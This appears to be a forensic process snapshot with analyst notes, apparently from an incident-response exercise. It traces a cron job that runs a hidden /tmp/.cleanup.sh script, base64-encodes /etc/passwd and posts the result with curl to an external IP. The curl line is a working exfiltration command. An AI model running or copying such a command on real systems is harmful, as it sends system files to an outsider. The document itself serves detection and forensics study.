@@ -1,0 +1,32 @@
+=========================================
+  PROCESS SNAPSHOT
+  Captured: Mar 16 06:01:15 UTC
+=========================================
+
+USER       PID  %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1   0.0  0.3  16904  3456 ?        Ss   Mar14   0:04 /sbin/init
+root         2   0.0  0.0      0     0 ?        S    Mar14   0:00 [kthreadd]
+root       312   0.0  0.1   5720  1280 ?        Ss   Mar14   0:01 /usr/sbin/sshd -D
+root       445   0.0  0.2  12460  2048 ?        Ss   Mar14   0:00 /usr/sbin/cron -f
+root       518   0.0  0.1   7884  1540 ?        S    Mar14   0:00 /usr/sbin/rsyslogd
+www-data   622   0.1  1.2  45200 12800 ?        S    Mar14   0:15 /usr/sbin/apache2 -k start
+www-data   623   0.1  1.1  44980 11520 ?        S    Mar14   0:14 /usr/sbin/apache2 -k start
+deploy     801   0.0  0.4  18700  4200 ?        S    06:00   0:00 /bin/bash /opt/deploy/health_check.sh
+root      5520   0.0  0.1   5200  1100 ?        S    06:00   0:00 /usr/sbin/CRON -f
+root      5521   0.2  0.3  11400  3200 ?        S    06:00   0:01 /bin/bash /tmp/.cleanup.sh
+root      5522   0.8  0.5  14200  5100 ?        S    06:00   0:00 /usr/bin/base64 /etc/passwd
+root      5523   0.3  0.2   8600  2400 ?        S    06:00   0:00 /usr/bin/curl -s -X POST -d @/tmp/.output.b64 http://203.0.113.45:8080/collect
+mysql      902   0.5  5.2 174500 53200 ?        Sl   Mar14   1:22 /usr/sbin/mysqld
+root      1001   0.0  0.1   6500  1400 ?        Ss   Mar14   0:00 /usr/lib/postfix/sbin/master
+postfix   1002   0.0  0.2  10200  2100 ?        S    Mar14   0:00 pickup -l -t unix -u -c
+postfix   1003   0.0  0.2  10300  2200 ?        S    Mar14   0:00 qmgr -l -t unix -u
+
+=========================================
+  END OF SNAPSHOT
+=========================================
+
+NOTES:
+  - PIDs 5520-5523 are all children of the cron job that ran at 06:00.
+  - PID 5522 is encoding a file using base64.
+  - PID 5523 is sending the encoded output to an external IP via HTTP POST.
+  - The destination IP 203.0.113.45 matches the attacker IP from auth.log.
